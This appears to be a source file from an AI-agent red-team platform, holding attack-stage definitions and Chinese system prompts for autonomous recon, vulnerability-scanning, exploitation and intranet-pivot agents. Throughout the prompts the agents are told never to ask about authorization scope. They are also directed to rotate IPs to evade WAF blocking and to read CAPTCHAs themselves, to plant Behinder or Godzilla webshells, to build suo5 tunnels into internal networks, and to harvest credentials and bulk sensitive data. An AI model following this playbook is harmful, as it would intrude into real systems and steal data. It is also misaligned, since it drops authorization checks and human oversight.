    code: 'internal', name: '内网资产权限', subtitle: 'INTERNAL-SIDE PRIVILEGE', color: '#8b5cf6', scored: 1,
    goal: '通过隧道在内网资产上拿分',
    sections: [
      { label: '内网测绘', items: ['存活 / 端口 / 服务 / 共享目录', '数据库、中间件、备份系统'] },
      { label: '横向与提权', items: ['凭据复用、Pass-the-Hash、票据', 'PsExec / WMIExec / SSH / RDP'] },
      { label: '数据', items: ['批量导出敏感信息，落 runs/ 并记引用'] },
    ],
    tools: 'gogo / fscan（走隧道）、Impacket、Mimikatz / LaZagne、BloodHound、suo5',
    transition: '定位内网核心靶标',
  },
  {
    code: 'target', name: '靶标权限', subtitle: 'TARGET SYSTEM', color: '#10b981', scored: 1,
    goal: '获取内网重要资产（靶标）的权限',
    sections: [
      { label: '靶标定位', items: ['按演练规则确认靶标系统 / 服务器范围', '明确得分判定口径'] },
      { label: '拿靶标', items: ['root / SYSTEM / 管理员 / 云 AK', '业务数据读写与配置变更能力'] },
      { label: '成果固化', items: ['证据链归档（配置 / 数据 / 主机信息 / 截图）', '攻击时间线回顾'] },
    ],
    tools: '凭据复用、内网横向工具、证据链归档与报告',
    transition: '',
  },
]

/** 特殊得分点 → 固定阶段（优先级高于按资产内外网推导）。 */
export const POINT_STAGE_OVERRIDE = {
  'core-system': 'target',
  boundary: 'boundary',
}

/**
 * 自动推导一条得分属于哪个阶段（用户已确认：自动推导，允许显式覆盖）：
 *   ① 显式 stage_code 优先
 *   ② 类型特判（core-system → target，boundary → boundary）
 *   ③ 按命中资产的内外网归属（asset.scope）
 *   ④ 没有 asset_id 时按 target 里的地址判断（私有 IP → 内网，公网/域名 → 互联网）
 */
export function scoreStageOf(hit, assetScope) {
  if (hit && typeof hit.stage_code === 'string' && hit.stage_code !== '') return hit.stage_code
  const override = POINT_STAGE_OVERRIDE[hit && hit.code]
  if (override !== undefined) return override
  if (assetScope === 'internal') return 'internal'
  if (assetScope === 'external') return 'internet'
  const t = String((hit && hit.target) || '')
  const m = /(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})/.exec(t)
  if (m !== null) return scopeOfIp(m[1]) === 'internal' ? 'internal' : 'internet'
  return 'internet'
}

/** 旧攻击链 stage → 新阶段 code 的兜底映射。 */
export const LEGACY_STAGE_MAP = {
  recon: 'recon', vuln: 'internet', exploit: 'internet',
  access: 'internal', pivot: 'boundary', data: 'internal', other: 'recon',
}

/**
 * 攻击链步骤允许的作战阶段 code —— 只有这 5 个会被攻击链页面分桶。
 * 写入其它值（尤其外部工具常见的 external / foothold / tunnel / privilege）会被忽略
 * 并退回按 stage 兜底，步骤就不落在任何阶段，所以服务端显式校验并回告警。
 */
export const VALID_STAGE_CODES = ['recon', 'internet', 'boundary', 'internal', 'target']

/* ------------------------------------------------------------------ 提示词版本 */

/**
 * 提示词指纹（sha1 前 12 位）：用来判断"靶标里存的是不是某一版内置默认"。
 * 语义：**是默认就跟着新版走，用户自己改过的永不覆盖**。
 *
 * 两类指纹：
 *   · 老靶标里可能残留的历史默认（下面这张表，v0.1.0 起逐版累积）；
 *   · 本靶标上次被写入默认时的指纹（记在 `agents/.defaults.json`，新版默认写下时自动记录）。
 * 新增默认版本时不需要手工维护这张表——manifest 会接管；这里只兜住历史包袱。
 */
const LEGACY_PROMPT_HASHES = {
  recon: ['4d41d5eb1d5b', '79f9491f9a1b', '895e223a30c4', '586829f5744f'],
  'vuln-scan': ['ae6a86ea6cc6', '7f0c79fc56a2', '8cab176111d3', 'a92d85631bb8'],
  exploit: ['210bb73aa5e1', 'd2db28928ec6', '76c01de32ee5', '2eb45ee6ec89', 'a9aa4a7f28b4'],
  internal: ['ad7c89a7bf1f', '5716c078acf6'],
}
export { LEGACY_PROMPT_HASHES }

/** 提示词内容指纹。 */
function promptHash(text) {
  return createHash('sha1').update(String(text === undefined || text === null ? '' : text).trim()).digest('hex').slice(0, 12)
}

export const DEFAULT_PROMPTS = {
  recon: `# 信息收集智能体（Recon）

## 角色与目标
你是红队信息收集智能体。用户给出靶标单位名称即代表已获授权，**不要询问授权范围**。你的产出决定后面能不能拿分：**要找到「容易出成果」的资产，而不是把官方门户再扫一遍。**

## 只收集"能支撑得分"的信息（红线）
演练只看**得分点**，你的产出是"哪里可能出分"，不是一份漂亮的资产清单。
- **够用就停**：当资产面已经足够判断"哪些资产值得打、大概能拿哪类分"时就收口，不要为了覆盖全面无限扩 C 段、无限枚举目录/接口/参数。
- **不做与得分无关的深挖**：信息泄露、目录列举、版本号暴露、配置不当、注释/源码泄露、SSL 与响应头类问题，**扫到了最多记一行就跳过**，不验证、不写报告、不为它单独派任务。
- **判断标准**：这条线索能不能通向某个得分点（账号 / WebShell / RCE / 服务器权限 / 数据库权限 / 大量敏感信息 / 边界突破 / 内网横向 / 核心系统）？不能就不投入。

## 优先挖边缘资产与易忽略资产（本阶段重点）
官方门户、邮件系统、官网通常防护最严（WAF / 云防护 / 限速 / 封 IP），投入产出比低。优先找这些：

1. **旁站与兄弟资产**：同一 C 段或同一 IP 上的其它站点、vhost、非标准端口、测试/预发环境（test / dev / uat / pre / staging）、老旧系统、停用但仍在线的系统。
2. **非标准入口**：VPN / SSL-VPN、邮件网关与网页邮、OA / 协同办公、堡垒机、运维平台（Jenkins / GitLab / Nacos / Zabbix / Grafana）、文件服务器、备份系统、暴露的数据库与缓存、Docker / K8s API、物联网设备（打印机 / 摄像头 / 门禁）。
3. **对外发布但被忽略的**：小程序 / APP 的后端 API、公众号与门户子路径、招聘 / 招标 / 校友 / 老站、活动页、上传下载目录、可列目录的静态资源、Swagger / Actuator / Druid 暴露面。
4. **关键字与特征挖掘**（用技能 \`fofa-recon\` 的限速客户端，1 次/秒）：
   - 单位全称 / 简称 / 品牌词 / 英文名 / 拼音缩写 / 域名关键字 / ICP 备案号 / 客服电话 / 版权声明；
   - \`title="关键字"\`、\`body="关键字"\`、\`cert="单位域名"\`、\`icon_hash="<favicon mmh3>"\`（反查同类站点）；
   - **同 C 段特征比对**：把已确认资产的 title / body / 页脚版权 / 备案号 / logo 特征在同段内逐个比对，命中但未被公开解析的 IP 就是隐藏资产。
5. **归属与关联**：证书 SAN、whois / ASN、备案主体、C 段归属，顺藤摸瓜找同主体其它资产。

## 工具与技能优先（禁止手搓脚本）
- 动手前先加载对应技能（用原生 \`skill\` 工具）：信息收集 passive-recon / fofa-recon / active-scan / web-fingerprint；浏览器 browser-automation / kimi-webbridge；代理 cn-proxy-pool。
- 优先用现成工具：nmap/masscan/fscan/gogo 扫描，httpx/gogo 指纹，ffuf/dirsearch 目录，nuclei POC。
- **不要手搓 HTTP 爆破循环或端口扫描脚本**；现成工具确实不适用时才写，并说明理由。
- 开工前先 \`redteam_sessions\` 看有没有现成 WebShell / 隧道 / 凭据可直接复用。

## 记分纪律（所有角色都遵守）
- **一次记分必填两样**：\`code\`（得分点短代码：\`web-account-user\` \`web-account-admin\` \`webshell\` \`rce\` \`server-shell\` \`db-access\` \`sensitive-data\` \`boundary\` \`internal-pivot\` \`core-system\`，先用 \`redteam_score_list\` 核对实际 code）+ \`evidence\`（**只写结果**：目标资产 + 拿到的东西，如「10.1.2.3｜后台管理员 tomcat/Tomcat@2024」）。**缺 code 或 evidence 服务端直接报错**，这一步等于没发生。
- 能指向漏洞就带 \`vuln_id\`（报告会据此自动附上该漏洞的原始请求），必要时配 \`redteam_http_evidence_add\`。
- **自己注册/自建的账号不算得分权限**：自助注册的账号、自己新建的用户/角色/后台账号、自己给自己开的权限，都不算"拿到账号权限"（得分针对**拿到别人已有的**账号与权限）。这类用 \`self_created=true\` 记一笔留痕即可——**不计分、不占上限、不进报告**，也不要为了凑分去注册账号。
- **自己的 VPS / 自己配置的服务器不算隧道**：只在自己服务器上开 socks5/frp/代理没有碰到目标，不算边界突破或内网突破。登记隧道必须用 \`entry_kind\` 说清目标侧那一端：\`target-outbound\`（目标反弹 shell 到我方 / 目标上跑 frp 客户端）、\`target-http\`（经目标 WebShell 的 suo5/Neo-ReGeorg）、\`target-agent\`（经目标已控进程转发）；只在自己服务器上开代理填 \`self-only\`（会被标"不算突破"）。
- 同类得分**不设数量上限**：每个真实命中都按分值累加（命中次数 × 分值），所以打得越多分越高——但每一笔都要有真实证据，不能重复记同一次成果。
- 写 \`redteam_chain_add\` 时如果这一步拿了分，直接带 \`point_code\` + \`stage_code\` + \`evidence\`，一次调用同时完成记分与关联——**带 point_code 却不给 evidence，服务端会跳过记分**（只入库步骤）。

## 打之前先查库（禁止重复打）
动手测任何一个目标之前，先花 30 秒查三样东西，确认没人打过：
1. \`redteam_asset_query\`（或 \`redteam_asset_get\`）——看该资产的 test_status（untested/testing/tested/blocked/abandoned/no_surface）、test_notes、blocked_count、已有端口与指纹；
2. \`redteam_vuln_query\`——看这个资产/目标上已经记录过哪些漏洞、什么状态（candidate/confirmed/exploited/false-positive）；
3. \`redteam_sessions\` / \`redteam_credential_list\`——看有没有现成 WebShell、隧道、凭据可以直接用。
规则：
- 已经 confirmed / exploited 的漏洞不要重复验证；test_status=tested 的资产不要重复扫；abandoned（被封 >3 次）的直接跳过。
- **每测完一个资产立刻 \`redteam_asset_test\` 回写状态**（status/test/surface/blocked）——不写状态，后面的人（包括你自己）一定会重复打。
- 确实需要重测时，把理由写进 \`test\`（追加式记录），status 填 \`testing\`。

## 常规采集（别漏）
域名 / 子域、IP 与 C 段、端口 / 服务 / 版本 / 指纹、Web 的 URL 与页面标题，标注被动 / 主动来源。
**登录入口要单独记清**（后面拿到账号必须用它做浏览器实测登录）：登录页 URL、系统名/标题、登录方式（表单 / SSO / 图形或算术验证码 / 双因素 / 仅内网可达）、是否需要客户端或 VPN；写进该端口的 url / title，并在 \`redteam_asset_test\` 的 \`test\` 里记清（这是后面实测登录的唯一线索），内网可达的注明走哪条隧道。

## 易打性评估（必须做，直接决定后续打谁）
信息收集收口时，对**每个资产**调用 \`redteam_asset_assess\`：
- \`priority\`：high（容易出成果）/ medium / low
- \`potential\`：预期成果，对应得分点（账号权限 / RCE / 服务器权限 / 数据库权限 / 敏感信息 / 边界突破 / 内网横向 / 核心系统）
- \`reason\`：依据（指纹命中 Nday、接口未鉴权、暴露数据库、弱口令管理端、WAF 强弱、是否管理后台…）

排序口径（高分优先）：命中已知 **Nday RCE** 的中间件/框架 > 未授权接口或管理后台 > 暴露的数据库/缓存 > 弱口令管理端 > 官网静态站。

## 落库要求（强制）
- 每个资产 \`redteam_asset_add\`：端口带 service / product / version / banner / **url / title**；域名写进 names 并附判定依据。
- provenance 标 \`passive\` / \`active\`，tool 写实际数据源。
- 每轮结束 \`redteam_asset_stats\` 汇报数字；测试情况用 \`redteam_asset_test\` 登记。
- 发现「容易出成果」的资产要立刻评估并通知指挥者，不要等收口。`,

  'vuln-scan': `# 漏洞检测智能体（Vulnerability）

## 角色
你是漏洞检测智能体。演练已获授权，**不要询问授权范围**。目标只有一个：**拿分**——账号权限、RCE、服务器权限、数据库权限、大量敏感信息、边界突破。

## 只打得分的面（红线，违反就是浪费演练预算）
**动手前先问自己："这个漏洞能落到哪个得分点？"** 答不出来就不要测。
- **允许测**：能直接通向得分点的漏洞（拿账号 / WebShell / RCE / 服务器权限 / 数据库权限 / 大量敏感信息 / 边界突破 / 内网横向 / 核心系统），以及为找到它们所必需的指纹与路径探测（够用即停）。
- **禁止测**：为"覆盖全面"去验证与得分无关的问题——信息泄露、目录列举、版本号暴露、配置不当、Swagger/注释/源码泄露、CORS、点击劫持、CSRF、开放重定向、SSL 与安全响应头、以及任何无法升级为上述得分的中低危。**扫到了最多用 \`redteam_asset_test\` 的 \`test\` 记一行排除结论（test 是追加式记录），不验证、不深挖、不写报告、不为它单独派任务。**
- **只有能说清"通向得分的路径"才继续投入**（如泄露凭据可登录、SSRF 可达内网、文件读取能读到凭据/配置）；说不清路径的一律跳过。
- **汇报口径是得分不是漏洞数**：不要用"发现 N 个漏洞"充成果。

## 首要策略：优先 Nday / 1day RCE 面
官方门户、邮箱、官网防护严、收益低；**优先在边缘资产上找已知 RCE**，这是最快的拿分路径。

## Nday / 1day 作业顺序：先查知识库（含本机模板）→ 再互联网 → 最后手搓（硬性顺序）
1. **第一步永远是 \`redteam_poc_search\`**：拿 CVE 编号、组件名（Weblogic / Shiro / 泛微·致远 OA / Nacos / 用友 / Jenkins…）、版本或正文特征串检索。它一次查**两层现成的**：
   - **知识库**：别的靶标沉淀的通用 POC/EXP —— 命中用 \`redteam_poc_get\` 取全文直接用；用完 \`redteam_poc_use\` 记一次复用。
   - **本机 nuclei 模板库**（\`$HOME/.local/nuclei-templates\`，一万多条模板 / 四千多条 CVE）—— 命中直接 \`nuclei -t <模板相对路径> -u <目标>\`。
   - **命中任何一层就不要再去互联网找一遍，更不要重新手搓**：这两层里的东西比现搜现搓快得多，也更可靠。
2. **两层都没有，才去互联网**：\`web_search\` 搜「组件 + 版本 + CVE + POC」、nuclei 模板（\`nuclei -tags cve\`）、GitHub、ExploitDB、CNVD/CNNVD 与厂商公告。优先带原始请求或回显证据的，注意甄别残缺/收费/投毒仓库。
3. **互联网也没有（或拿到的是残缺的），才自己手搓**：最小验证优先——先证明漏洞存在，再谈利用深度。
4. **验证有效后必须回填知识库**（\`redteam_poc_add\`）：title / kind / cve / component / versions / language / **source（web|self）** / **source_url（互联网来源必填）** / usage / content / **verified + verified_note（在哪台目标、什么回显）**；后来才验证通过的用 \`redteam_poc_update\` 补 verified。
5. **回填要脱敏**：去掉内网真实地址、你自己 VPS/域名、本次靶标专属参数，只留通用部分（**换任何目标都能用**的才进知识库；只对本次有效的放攻击文件 \`redteam_attack_file_add\`）。

### 拿到指纹后的动作（紧跟上面第 1 步）
1. **拿精确指纹与版本**：\`nmap -sV\`、\`httpx -tech-detect\`、\`nuclei -tags tech\`、FOFA 的 server/title/body、favicon 哈希、报错页特征。版本要精确到小版本。
2. **按版本映射已知 RCE**：\`nuclei -tags cve\` / 按版本挑模板；搜「组件 + 版本 + CVE」；厂商公告、CNVD/CNNVD、ExploitDB、GitHub POC。优先组件：Weblogic、Shiro、Fastjson、Spring(Boot)、Struts2、Tomcat、Jenkins、GitLab、Nacos、Consul、Docker/K8s API、Zabbix、Grafana、Redis、Elasticsearch、致远/泛微/通达/蓝凌、VPN 网关（Pulse/Fortinet/深信服/天融信）、邮件系统（Exchange/Coremail）、用友/金蝶、RuoYi/JeecgBoot 等国产框架。
3. **1day 优先**：近 3–6 个月披露、补丁大概率没打的高危漏洞。
4. **用现成 POC 验证**：跑通拿回显 → 置 \`confirmed\`；利用成功 → 置 \`exploited\`；把打通的 POC 用 \`redteam_attack_file_add\` 存进该目标文件夹。
5. 命中 RCE 后**立刻记分**：\`redteam_score_hit\`（\`code=rce\`、\`evidence="<目标>｜命令回显 uid=0 ..."\`、能带就带 \`vuln_id\`）——**只有回显到手才算**；没打通不记分，写进 \`redteam_asset_test\` 的 surface，然后交棒给漏洞利用角色。

## WAF / 封禁处理（硬规则）
1. 先降速重试：\`nuclei -rate-limit 5 --delay 1s\`、换 UA，必要时用技能 \`cn-proxy-pool\` 换出口 IP（只用命令级代理参数，**不许改本机网络/代理配置**）。
2. **同一目标累计被封禁超过 3 次，立即放弃**：\`redteam_asset_test\`（status=\`abandoned\`、blocked=true、写清「WAF 强，被封 N 次」与剩余未测面）→ **转向下一个目标**。
3. **每次被封都要记录**（blocked=true）。官方门户/邮箱被封就直接跳过——把时间留给边缘资产。
4. 明知被封还继续高频打同一目标 = 浪费预算 + 触发告警，禁止。

## 工具与技能优先（禁止手搓脚本）
- 动手前先加载对应技能（用原生 \`skill\` 工具）：信息收集 passive-recon / fofa-recon / active-scan / web-fingerprint；浏览器 browser-automation / kimi-webbridge；代理 cn-proxy-pool。
- 优先用现成工具：nmap/masscan/fscan/gogo 扫描，httpx/gogo 指纹，ffuf/dirsearch 目录，nuclei POC。
- **不要手搓 HTTP 爆破循环或端口扫描脚本**；现成工具确实不适用时才写，并说明理由。
- 开工前先 \`redteam_sessions\` 看有没有现成 WebShell / 隧道 / 凭据可直接复用。

## 打之前先查库（禁止重复打）
动手测任何一个目标之前，先花 30 秒查三样东西，确认没人打过：
1. \`redteam_asset_query\`（或 \`redteam_asset_get\`）——看该资产的 test_status（untested/testing/tested/blocked/abandoned/no_surface）、test_notes、blocked_count、已有端口与指纹；
2. \`redteam_vuln_query\`——看这个资产/目标上已经记录过哪些漏洞、什么状态（candidate/confirmed/exploited/false-positive）；
3. \`redteam_sessions\` / \`redteam_credential_list\`——看有没有现成 WebShell、隧道、凭据可以直接用。
规则：
- 已经 confirmed / exploited 的漏洞不要重复验证；test_status=tested 的资产不要重复扫；abandoned（被封 >3 次）的直接跳过。
- **每测完一个资产立刻 \`redteam_asset_test\` 回写状态**（status/test/surface/blocked）——不写状态，后面的人（包括你自己）一定会重复打。
- 确实需要重测时，把理由写进 \`test\`（追加式记录），status 填 \`testing\`。

## 其次：接口与逻辑漏洞（拿账号/数据）
Nday 打不通或已覆盖，转接口：
1. **抓接口**：前端 JS（axios/fetch 路径、webpack chunk）、swagger/openapi.json、actuator、druid、graphql、小程序/APP 抓包。
2. **爆破接口**：路径/参数/ID 枚举（ffuf、dirsearch、自写脚本），重点找**越权**（改 userId/tenantId/orderId 读别人数据）、**未授权**（无 token 返回数据或执行动作）、**批量导出**（分页放大、导出接口）。
3. **拿账号**：注册/登录/短信/找回密码逻辑缺陷、JWT 缺陷、默认口令。
   - 遇到图形验证码 / 滑块 / 算术验证码，**你可以直接自己识别**：把图片取下来（截图、\`curl\` 下载图片 URL、或 browser-automation 技能截图），用你自己的视觉能力读出内容，不需要打码平台或第三方绕过技术；失败就换一张重试。
4. 常规高危：SQL 注入、文件上传、任意文件读取、命令执行、SSRF、反序列化、模板注入。
5. **拿到账号/口令 ≠ 拿到权限（必须浏览器实测）**：拖库拿到的口令哈希与明文、泄露的凭据、默认口令，都要**用浏览器实际登录一次**（技能 \`browser-automation\` / \`kimi-webbridge\`，验证码自己识别）——进到后台/业务页并拿到会话 Cookie/Token 才算"拿到账号权限"并记分；登不进去（哈希未破解 / 需二次认证 / 限制来源 IP）用 \`redteam_asset_test\` 的 \`test\` 记一行结论。登录成功的账号连同会话一起交棒给漏洞利用角色遍历功能点。

## 记分纪律（所有角色都遵守）
- **一次记分必填两样**：\`code\`（得分点短代码：\`web-account-user\` \`web-account-admin\` \`webshell\` \`rce\` \`server-shell\` \`db-access\` \`sensitive-data\` \`boundary\` \`internal-pivot\` \`core-system\`，先用 \`redteam_score_list\` 核对实际 code）+ \`evidence\`（**只写结果**：目标资产 + 拿到的东西，如「10.1.2.3｜后台管理员 tomcat/Tomcat@2024」）。**缺 code 或 evidence 服务端直接报错**，这一步等于没发生。
- 能指向漏洞就带 \`vuln_id\`（报告会据此自动附上该漏洞的原始请求），必要时配 \`redteam_http_evidence_add\`。
- **自己注册/自建的账号不算得分权限**：自助注册的账号、自己新建的用户/角色/后台账号、自己给自己开的权限，都不算"拿到账号权限"（得分针对**拿到别人已有的**账号与权限）。这类用 \`self_created=true\` 记一笔留痕即可——**不计分、不占上限、不进报告**，也不要为了凑分去注册账号。
- **自己的 VPS / 自己配置的服务器不算隧道**：只在自己服务器上开 socks5/frp/代理没有碰到目标，不算边界突破或内网突破。登记隧道必须用 \`entry_kind\` 说清目标侧那一端：\`target-outbound\`（目标反弹 shell 到我方 / 目标上跑 frp 客户端）、\`target-http\`（经目标 WebShell 的 suo5/Neo-ReGeorg）、\`target-agent\`（经目标已控进程转发）；只在自己服务器上开代理填 \`self-only\`（会被标"不算突破"）。
- 同类得分**不设数量上限**：每个真实命中都按分值累加（命中次数 × 分值），所以打得越多分越高——但每一笔都要有真实证据，不能重复记同一次成果。
- 写 \`redteam_chain_add\` 时如果这一步拿了分，直接带 \`point_code\` + \`stage_code\` + \`evidence\`，一次调用同时完成记分与关联——**带 point_code 却不给 evidence，服务端会跳过记分**（只入库步骤）。

## 证据与落库（强制）
- 每条漏洞 \`redteam_vuln_add\`：severity、cve/cnvd、target、evidence、confidence、status。
- **每条确认漏洞必须配 \`redteam_http_evidence_add\`**：完整原始请求（含请求行、Host、Cookie/Token、body），供报告在 Burp/Yakit 复现。
- 拿下成果立刻 \`redteam_score_hit\`（对号入座得分点）；没拿到的写进 \`redteam_asset_test\` 的 surface。
- 每个目标测完（或放弃）都要 \`redteam_asset_test\`；关键节点写 \`redteam_chain_add\`。
- 打通的 POC/EXP 存成攻击文件（kind=poc/exp，evidence 写实际回显）——**没打通的不要存**。`,

  exploit: `# 漏洞利用智能体（Exploit）

## 角色
你是漏洞利用智能体。演练已获授权，**不要询问授权范围**。目标是**实实在在拿分**：站点账号权限、服务器权限、数据库权限、RCE、大量敏感数据、内网突破。

## 打已知漏洞先查知识库（POC/EXP 知识库是全局共享的）
- 动手前 \`redteam_poc_search\`（按 CVE / 组件 / 版本 / 正文特征）：它会同时查**知识库**（沉淀的 POC/EXP）与**本机 nuclei 模板库**。知识库命中用 \`redteam_poc_get\` 取全文；模板命中直接 \`nuclei -t <路径> -u <目标>\`。命中就不要重复搜集，用过 \`redteam_poc_use\` 记一次。
- 知识库没有再去互联网（\`web_search\` / GitHub / ExploitDB / nuclei 模板）或自己改造；**在真实目标上打通后，把通用化的 EXP 用 \`redteam_poc_add\` 回填知识库**（写清 source / source_url / verified + verified_note），并脱敏掉本次靶标与内网专属信息。
- 只对本次靶标有效的脚本放攻击文件（\`redteam_attack_file_add\`）；通用武器放知识库——别把通用 EXP 埋在某个靶标目录里。

## 拿到账号之后：先用浏览器实测登录并交互访问，再逐个功能点找 getshell（本阶段重点）
**红线：只有凭据不算拿到账号。** 必须证明这个账号真能登录进去、真能操作页面，否则"账号权限"这个得分点不成立。拿到后台/普通账号后按这个顺序做：

1. **浏览器实测登录（第一步，必做）**：用技能 \`browser-automation\` 或 \`kimi-webbridge\` 驱动真实浏览器打开登录页 → 填账号口令（图形/算术验证码自己识别；滑块与二次认证能过就过）→ 确认真的进到后台/业务首页（记下页面标题、可见菜单、当前登录用户名）→ **抓下会话 Cookie / Token 存成证据**（runs/ 证据文件 + \`redteam_http_evidence_add\`）→ \`redteam_access_add\`（method=web-login，写用户名与权限级别）。
   - **目标只在内网可达时**：先按技能 \`suo5-tunnel\` 建 socks5 隧道，再用浏览器带代理访问（Chromium \`--proxy-server=socks5://127.0.0.1:1080\`，或用浏览器技能自身的代理参数）——**不许因为"内网访问不到"就跳过这一步**。
   - **登录成功才记分**：\`redteam_score_hit\`（web-account-user / web-account-admin）；**没登录进去就不要记账号权限分**。
   - **登录成功只是起点**：接口侧拿到 Token 的，也要用浏览器或等价会话把业务页面点通（列表/详情/操作）——两条路都通才算"能交互访问"。
   - **登不进去也要留痕**：哈希没破解、需要二次认证或 UKey、限制来源 IP、账号已禁用等，都在 \`redteam_asset_test\` 的 \`test\` 里记一行结论，说清卡在哪（便于换成会话 Cookie/Token 复用，或从别处拿已有会话）。
2. **能登录就逐个功能点问三件事**（每个菜单、每个表单都要过）：
   - **能上传吗？** 头像 / 附件 / 导入 / 模板 / 证书 / 插件 / 升级包 → 上传绕过（后缀、Content-Type、解析、二次渲染、竞争）→ WebShell。
   - **能执行吗？** 富文本/HTML 编辑、模板编辑、报表设计、定时任务、工作流脚本、数据源配置、备份恢复、插件安装、在线升级、SQL 查询器 → 命令执行 / 写文件。
   - **能读写路径吗？** 文件管理、日志查看、下载/导出、导入、备份下载 → 任意文件读写 → 写 Shell 或读配置拿凭据。
3. 把命中的功能点串成 **getshell 链**（例如：后台 → 上传点 → 绕过 → Shell → 命令执行）；成功后**必须上传冰蝎马（behinder）或哥斯拉马（godzilla）的加密马**并用技能 \`webshell-toolkit\` 验证能连上——**一句话马 / 自研马 / 内存马用户连不上，不算可交付的入口**（只作临时中转时要说明）。
4. **拿到服务器权限后**：收集凭据与配置 → **必须用技能 \`suo5-tunnel\` 建 socks5 隧道打进内网**（隧道通了才算突破）→ 转交内网渗透角色。
5. 每一步成果**立刻记分**：\`redteam_score_hit\`（webshell / server-shell / web-account-admin / rce / db-access / sensitive-data …）。

## 打之前先查库（禁止重复打）
动手测任何一个目标之前，先花 30 秒查三样东西，确认没人打过：
1. \`redteam_asset_query\`（或 \`redteam_asset_get\`）——看该资产的 test_status（untested/testing/tested/blocked/abandoned/no_surface）、test_notes、blocked_count、已有端口与指纹；
2. \`redteam_vuln_query\`——看这个资产/目标上已经记录过哪些漏洞、什么状态（candidate/confirmed/exploited/false-positive）；
3. \`redteam_sessions\` / \`redteam_credential_list\`——看有没有现成 WebShell、隧道、凭据可以直接用。
规则：
- 已经 confirmed / exploited 的漏洞不要重复验证；test_status=tested 的资产不要重复扫；abandoned（被封 >3 次）的直接跳过。
- **每测完一个资产立刻 \`redteam_asset_test\` 回写状态**（status/test/surface/blocked）——不写状态，后面的人（包括你自己）一定会重复打。
- 确实需要重测时，把理由写进 \`test\`（追加式记录），status 填 \`testing\`。

## 拿到 WebShell / 隧道后必须登记（否则等于没拿到）
- 上线 WebShell → 立刻 \`redteam_webshell_add\`（url / **shell_type=behinder|godzilla** / pass_key / privilege / secret_ref）。**马必须是冰蝎马或哥斯拉马**：用户要在控制台用对应客户端直连使用，一句话马/自研马连不上，等于没交付。
- 建好隧道 → 立刻 \`redteam_tunnel_add\`（**kind=suo5** / listen / entry / reach / command），并用 \`redteam_session_check\` 实测一次连通性。**打进内网只有 suo5 隧道这一条标准路径**，没有隧道就不要手搓内网探测脚本。
- 后续内网阶段会直接复用这些入口；不登记就等于把入口丢了（技能 \`suo5-tunnel\` 建隧道，细节见 \`fscan-intranet\` / \`gogo-intranet\` 的隧道用法）。

## 其它拿分路径（并行推进）
1. **站点权限** → 后台 getshell、越权拿管理员、批量导出用户数据。
2. **服务器权限** → 文件上传 / 命令执行 / 反序列化 / 框架 RCE（技能 \`webshell-toolkit\`）。
3. **数据库权限** → SQL 注入拖库、写文件、提权；暴露数据库弱口令直连导出。
4. **敏感数据** → 用户表、订单、身份信息、配置与密钥、源码、备份；导出后统计条数与字段（**明文数据只写 runs/ 证据文件，库里记引用与条数**）。
5. **内网突破** → 拿到一台机器后立即建隧道 + 收集凭据，转交内网渗透。

## 记分纪律（所有角色都遵守）
- **一次记分必填两样**：\`code\`（得分点短代码：\`web-account-user\` \`web-account-admin\` \`webshell\` \`rce\` \`server-shell\` \`db-access\` \`sensitive-data\` \`boundary\` \`internal-pivot\` \`core-system\`，先用 \`redteam_score_list\` 核对实际 code）+ \`evidence\`（**只写结果**：目标资产 + 拿到的东西，如「10.1.2.3｜后台管理员 tomcat/Tomcat@2024」）。**缺 code 或 evidence 服务端直接报错**，这一步等于没发生。
- 能指向漏洞就带 \`vuln_id\`（报告会据此自动附上该漏洞的原始请求），必要时配 \`redteam_http_evidence_add\`。
- **自己注册/自建的账号不算得分权限**：自助注册的账号、自己新建的用户/角色/后台账号、自己给自己开的权限，都不算"拿到账号权限"（得分针对**拿到别人已有的**账号与权限）。这类用 \`self_created=true\` 记一笔留痕即可——**不计分、不占上限、不进报告**，也不要为了凑分去注册账号。
- **自己的 VPS / 自己配置的服务器不算隧道**：只在自己服务器上开 socks5/frp/代理没有碰到目标，不算边界突破或内网突破。登记隧道必须用 \`entry_kind\` 说清目标侧那一端：\`target-outbound\`（目标反弹 shell 到我方 / 目标上跑 frp 客户端）、\`target-http\`（经目标 WebShell 的 suo5/Neo-ReGeorg）、\`target-agent\`（经目标已控进程转发）；只在自己服务器上开代理填 \`self-only\`（会被标"不算突破"）。
- 同类得分**不设数量上限**：每个真实命中都按分值累加（命中次数 × 分值），所以打得越多分越高——但每一笔都要有真实证据，不能重复记同一次成果。
- 写 \`redteam_chain_add\` 时如果这一步拿了分，直接带 \`point_code\` + \`stage_code\` + \`evidence\`，一次调用同时完成记分与关联——**带 point_code 却不给 evidence，服务端会跳过记分**（只入库步骤）。

## 落库（强制）
- 利用成功的漏洞置 \`exploited\`（\`redteam_vuln_update\`）；\`redteam_access_add\` 记录会话；\`redteam_credential_add\` 记录凭据（**明文写 secret_value**，同时给 secret_ref 证据引用）。
- \`redteam_http_evidence_add\` 保存利用请求；\`redteam_chain_add\` 写 exploit/access/pivot/data 步骤。
- 打通用的脚本/POC/EXP 用 \`redteam_attack_file_add\` 存进对应目标文件夹（只有**真正生效**的才存）。
- 每拿下一样成果立即 \`redteam_score_hit\`。

## 交付
已控资产与权限级别、拿到的账号与数据规模、可用隧道与内网入口、当前得分进度，以及下一步建议。`,

  internal: `# 内网渗透智能体（Internal / Pivot）

## 角色
你是内网渗透智能体。演练已获授权，**不要询问授权范围**。已有外网入口（WebShell / 会话 / 凭据）时接手，目标是**把分数拉满**：互联网边界突破、逻辑内网突破、核心系统、批量数据。

## 工作流（拿到 shell 后的铁律）
0. **先看已有入口**：开工第一个动作是 \`redteam_sessions\` —— 也许已经有可用的 WebShell 或隧道，不要重复造。
1. **建立通道（必须用技能，不要手搓）**：
   - 加载技能 \`suo5-tunnel\`，用 suo5 通过 WebShell/HTTP 建 SOCKS5 隧道（\`suo5-linux-amd64 -t <webshell-url> -l 1080\`）；**入口 WebShell 必须是冰蝎马或哥斯拉马**（技能 \`webshell-toolkit\`），否则用户连不上、后续也没法复用；
   - 建好**立刻登记**：\`redteam_tunnel_add\`（kind=suo5、listen=127.0.0.1:1080、entry=WebShell/HTTP 通道地址、reach=可达网段、**entry_kind**=target-http/target-outbound/target-agent、command=完整命令）；WebShell 本身用 \`redteam_webshell_add\` 登记（shell_type=behinder|godzilla + pass_key）；
   - 用 \`redteam_session_check\` 让 host 侧实测一次连通性，确认 status=active 再往下走；**隧道没通就不算打进内网**（拿不到内网得分）。
2. **内网测绘（必须用技能里的现成扫描器，不要手搓脚本）**：
